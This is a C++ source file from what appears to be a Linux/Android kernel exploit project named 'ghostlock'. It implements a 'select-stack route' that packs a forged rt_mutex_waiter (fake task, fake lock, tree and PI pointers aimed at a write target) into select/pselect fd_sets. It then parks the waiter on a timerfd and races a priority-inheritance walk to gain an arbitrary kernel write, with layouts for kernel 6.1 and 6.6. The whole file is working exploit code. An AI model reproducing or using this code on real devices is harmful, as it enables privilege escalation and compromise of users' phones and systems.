#include "common.h"
#include <time.h>
#include <netinet/in.h>
#include <sys/timerfd.h>

#include "target.h"
#include "session/exploit_session.hpp"

#include "routes/select_stack_route.h"

namespace ghostlock::route {

/* Decoupling plan: route-local elapsed-time helper. Input: monotonic reference;
 * output: elapsed milliseconds. Future: shared_elapsed_ms(const timespec *);
 * move to the stateless time helper module and make the input const. */
static double fops_elapsed_ms(struct timespec *ref) {
    return runtime_elapsed_ms(ref);
}

static const struct execution_settings *execution_settings(void) {
    return target_profile_execution(&g_target_profile);
}
/* Decoupling plan: choose route timing delay. Input: attempt and eventually
 * immutable profile; output: microseconds. Future:
 * select_stack_delay_usec(const TargetProfile *, int). */
static int route_delay_usec(const SelectStackRouteContext *context,
        int attempt) {
    (void) attempt;
    /* Both routes: let select/pselect establish its frame and stamp the
     * crafted waiter before the PI walk fires. */
    return (int) context->execution->select_enter_delay_us;
}

void fdset_put_word(fd_set *set, int word, uint64_t value) {
    unsigned long *bits = (unsigned long *) set;
    bits[word] = (unsigned long) value;
}

uint64_t fdset_get_word(const fd_set *set, int word) {
    const unsigned long *bits = (const unsigned long *) set;
    return bits[word];
}

static int pselect_words_per_set(void) {
    int bits_per_word = (int) (8 * sizeof(unsigned long));
    return (PSELECT_ROUTE_NFDS + bits_per_word - 1) / bits_per_word;
}

static int pselect_put_global_word(
        fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
        int global_word, uint64_t value) {
    if (global_word < 0) {
        return 0;
    }

    int set_idx = global_word / words_per_set;
    int word_idx = global_word % words_per_set;
    switch (set_idx) {
        case 0:
            ghostlock::route::fdset_put_word(in, word_idx, value);
            return 1;
        case 1:
            ghostlock::route::fdset_put_word(out, word_idx, value);
            return 1;
        case 2:
            ghostlock::route::fdset_put_word(ex, word_idx, value);
            return 1;
        default:
            return 0;
    }
}

/* Decoupling plan: read the select-stack waiter layout. Input: profile; output:
 * word shift. Future: select_stack_waiter_shift(const TargetProfile *). */
static int pselect_waiter_shift(const SelectStackRouteContext *context) {
    return target_profile_is_loaded(&g_target_profile)
            ? context->layout.waiter_shift
            : PSELECT_WAITER_WORD_SHIFT;
}

/* Decoupling plan: encode a logical waiter word across select fd_sets. Inputs:
 * layout, sets, word/value; output: placement status. Future:
 * select_stack_put_waiter_word(layout, sets, ...), without global profile. */
static void pselect_put_waiter_word(
        SelectStackRouteContext *context, int words_per_set,
        int waiter_word, uint64_t value, const char *name) {
    int global_word = ghostlock::route::pselect_waiter_shift(context) + waiter_word;
    int placed = ghostlock::route::pselect_put_global_word(
            context->input_set.raw(), context->output_set.raw(),
            context->exception_set.raw(),
            words_per_set, global_word, value);
    if (!placed) {
        pr_warning("pselect cannot place %s waiter_word=%d global_word=%d "
                   "words_per_set=%d nfds=%d\n",
                name, waiter_word, global_word, words_per_set,
                PSELECT_ROUTE_NFDS);
    }
}

/* Decoupling plan: materialize descriptors selected by the crafted fd_sets.
 * Inputs: sets and source fds; output: owned duplicated descriptors. Future:
 * select_stack_open_fds(SelectStackRouteContext *, const SelectStackSets *). */
static void open_selected_fds(
        fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd) {
    /* every bit lands on the read end so select/pselect parks the full window */
    (void) write_fd;
    int high_read = fcntl(read_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
    if (high_read < 0) {
        pr_warning("pselect F_DUPFD read errno=%d\n", errno);
        return;
    }
    for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
        if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
            dup2(high_read, fd);
        }
    }
    close(high_read);
    dup2(read_fd, PSELECT_ROUTE_NFDS - 1);
    FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
}

static int standard_io_backup[3] = {-1, -1, -1};

/* Decoupling plan: preserve standard descriptors before select-stack setup.
 * Input: route context; output: backup descriptors. Future:
 * select_stack_backup_stdio(SelectStackRouteContext *). */
void reserve_standard_io(void) {
    for (int fd = 0; fd < 3; fd++) {
        if (standard_io_backup[fd] >= 0) continue;
        int backup = fcntl(fd, F_DUPFD, PSELECT_ROUTE_NFDS + 64);
        if (backup < 0) {
            pr_warning("standard io backup failed fd=%d errno=%d\n", fd, errno);
        } else {
            standard_io_backup[fd] = backup;
        }
    }
}

/* Decoupling plan: restore standard descriptors from route-owned backups.
 * Input: route context; output: restored/closed state. Future:
 * select_stack_restore_stdio(SelectStackRouteContext *). */
static void restore_standard_io(const ghostlock::BorrowedFd backup[3]) {
    for (int fd = 0; fd < 3; fd++) {
        if (!backup[fd].valid()) continue;
        dup2(backup[fd].get(), fd);
    }
}

/* Decoupling plan: build the compact/tree select-stack waiter image. Inputs:
 * profile, payload layout and write request; output: three fd_sets. Future:
 * ghostlock::route::select_stack_build_fdsets(profile, payload, request, result). */
static void select_stack_build_fdsets(SelectStackRouteContext *context) {
    ghostlock::FdSet *in = &context->input_set;
    ghostlock::FdSet *out = &context->output_set;
    ghostlock::FdSet *ex = &context->exception_set;
    const WriteRequest *request = context->request;
    in->zero();
    out->zero();
    ex->zero();

    int words_per_set = pselect_words_per_set();
    int compact = context->layout.compact_waiter;

    struct pselect_waiter_word {
        int word;
        uint64_t value;
        const char *name;
    };

    if (compact) {
        /* 6.1 compact write route (Root-My-Pixel-Payloads src/61/fops.c): tree/pi parents carry
         * the write value, children the write target; waiter->task is the
         * payload fake_task (planted fields for the PI walk). */
        struct pselect_waiter_word words[] = {
                {2, (g_heap_context.current.fake_right), "tree_pc"},
                {3, 0, "tree_right"},
                {4, request->target, "tree_left"},
                {5, (g_heap_context.current.fake_right), "pi_pc"},
                {6, 0, "pi_right"},
                {7, request->target, "pi_left"},
                {8, (g_heap_context.current.fake_task), "task"},
                {9, (g_heap_context.current.fake_lock), "lock"},
                {10, ((uint64_t) FAKE_WAITER_PRIO << 32) | 3, "wake_prio"},
                {11, 0, "deadline"},
                {12, 0, "ww_ctx"},
        };
        for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
            struct pselect_waiter_word *w = &words[i];
            ghostlock::route::pselect_put_waiter_word(context, words_per_set,
                    w->word, w->value, w->name);
        }
    } else {
        /* 6.6 rt_mutex_waiter with rb_node tree/pi_tree */
        struct pselect_waiter_word words[] = {
                {2, 0, "tree_pc"},
                {3, 0, "tree_right"},
                {4, 0, "tree_left"},
                {5, 1, "tree_prio"},
                {6, 0, "tree_deadline"},
                {7, 0, "pi_parent"},
                {8, 0, "pi_right"},
                {9, 0, "pi_left"},
                {10, 1, "pi_prio"},
                {11, 0, "pi_deadline"},
                {12, (g_heap_context.current.fake_task), "task"},
                {13, (g_heap_context.current.fake_lock), "lock"},
                {14, 3, "wake_state"},
        };
        for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
            struct pselect_waiter_word *w = &words[i];
            ghostlock::route::pselect_put_waiter_word(context, words_per_set,
                    w->word, w->value, w->name);
        }
    }
}


}  // namespace ghostlock::route

int ghostlock::SelectStackRoute::prepare() noexcept {
    if (!(g_heap_context.current.base) || !(g_heap_context.current.fake_lock) || !(g_heap_context.current.fake_fops)) {
        pr_warning("pselect route missing kernel page base=%016zx lock=%016zx "
                   "fops=%016zx\n", (g_heap_context.current.base), (g_heap_context.current.fake_lock), (g_heap_context.current.fake_fops));
        return fail(30, 0);
    }
    int fds[2];
    if (pipe(fds) != 0) {
        return fail(31, errno);
    }
    pipe_read.reset(fds[0]);
    pipe_write.reset(fds[1]);

    /* Both routes park on a never-ready timerfd: the waiter must stay stale
     * on the pselect stack for the whole consumer window. */
    block.reset((int) syscall(SYS_timerfd_create, CLOCK_MONOTONIC, TFD_CLOEXEC));
    if (!block.valid()) {
        pr_warning("pselect timerfd_create failed errno=%d; using pipe read end\n",
                errno);
        block_borrows_pipe = 1;
    }
    high_read.reset(fcntl(block_fd(), F_DUPFD_CLOEXEC, PSELECT_ROUTE_NFDS + 16));
    if (!high_read.valid()) {
        pr_warning("pselect F_DUPFD read errno=%d\n", errno);
        return fail(32, errno);
    }

    ghostlock::route::select_stack_build_fdsets(this);
    pr_info("pselect route setup shift=%d page=%016zx "
            "fake_lock=%016zx fake_w0=%016zx fake_task=%016zx "
            "in0=%016llx in3=%016llx out0=%016llx ex0=%016llx "
            "ex1=%016llx ex2=%016llx ex3=%016llx\n",
            ghostlock::route::pselect_waiter_shift(this),
            (g_heap_context.current.base), (g_heap_context.current.fake_lock), (g_heap_context.current.fake_w0), (g_heap_context.current.fake_task),
            (unsigned long long) ghostlock::route::fdset_get_word(input_set.raw(), 0),
            (unsigned long long) ghostlock::route::fdset_get_word(input_set.raw(), 3),
            (unsigned long long) ghostlock::route::fdset_get_word(output_set.raw(), 0),
            (unsigned long long) ghostlock::route::fdset_get_word(exception_set.raw(), 0),
            (unsigned long long) ghostlock::route::fdset_get_word(exception_set.raw(), 1),
            (unsigned long long) ghostlock::route::fdset_get_word(exception_set.raw(), 2),
            (unsigned long long) ghostlock::route::fdset_get_word(exception_set.raw(), 3));

    /* The route may replace low fds, including stdout and stderr. */
    ghostlock::route::open_selected_fds(input_set.raw(), output_set.raw(), exception_set.raw(),
            high_read.get(), pipe_write.get());
    owned_input_set = input_set;
    owned_output_set = output_set;
    owned_exception_set = exception_set;
    high_read.reset();
    selected_fds_installed = 1;
    return 0;
}

RouteStatus ghostlock::SelectStackRoute::execute() noexcept {
    struct timespec route_t0;
    clock_gettime(CLOCK_MONOTONIC, &route_t0);

    atomic_store(&race->consumer_calls, 0);
    atomic_store(&race->consumer_success, 0);
    atomic_store(&race->consumer_stop, 0);
    int delay_usec = ghostlock::route::route_delay_usec(this, 1);
    atomic_store(&race->route_delay_usec, delay_usec);
    atomic_store(&race->consumer_go, 1);

    pr_info("pselect pre-select compact=%d +%.0fms\n",
            layout.compact_waiter,
            ghostlock::route::fops_elapsed_ms(&route_t0));
    errno = 0;
    if (layout.compact_waiter) {
        uint32_t timeout_us = execution->select_timeout_us;
        struct timespec ts = {
                .tv_sec = timeout_us / 1000000,
                .tv_nsec = (long) (timeout_us % 1000000) * 1000,
        };
        select_result = pselect(
                PSELECT_ROUTE_NFDS, input_set.raw(), output_set.raw(),
                exception_set.raw(), &ts, NULL);
    } else {
        uint32_t timeout_us = execution->select_timeout_us;
        struct timeval timeout = {
                .tv_sec = timeout_us / 1000000,
                .tv_usec = timeout_us % 1000000,
        };
        select_result = select(
                PSELECT_ROUTE_NFDS, input_set.raw(), output_set.raw(),
                exception_set.raw(), &timeout);
    }
    select_errno = errno;
    ghostlock::route::restore_standard_io(stdio_backup);
    pr_info("pselect post-select compact=%d +%.0fms ret=%d\n",
            layout.compact_waiter, ghostlock::route::fops_elapsed_ms(&route_t0),
            select_result);
    atomic_store(&race->consumer_go, 0);

    calls = atomic_load(&race->consumer_calls);
    successes = atomic_load(&race->consumer_success);
    if (calls > 0 && successes > 0) {
        status.code = ROUTE_OK;
        status.step = 0;
        status.error_number = 0;
    } else {
        (void) fail(33, select_errno);
    }
    return status;
}

namespace ghostlock::route {


RouteStatus do_pselect_fake_lock_route(const WriteRequest *request) {
    /* TODO(post-S15:SELECT-01): Compact outer retries must
     * rebuild both ghostlock::memory::HeapContext payload ownership and PiRaceContext sequencing.
     * Keep this route invocation single-shot until ExploitSession can create a
     * fresh context per attempt; timeout/delay remain profile-owned meanwhile. */
    SelectStackRouteContext context(
            &ghostlock::g_exploit_session.race, request, execution_settings(),
            target_profile_select_stack_layout(&g_target_profile),
            standard_io_backup);
    if (context.prepare() == 0) {
        (void) context.execute();
    }
    context.disarm();
    context.destroy();
    if (context.status.code == ROUTE_DIRTY_FAILURE &&
            context.status.step == 34) {
        pr_error("pselect consumer still inflight; leaking route fds\n");
    }

    pr_info("pselect route done calls=%d success=%d status=%d clean=%d/%d "
            "step=%d errno=%d\n", context.calls, context.successes,
            context.status.code, context.status.userspace_clean,
            context.status.kernel_disarmed, context.status.step,
            context.status.error_number);
    return context.status;
}

}  // namespace ghostlock::route
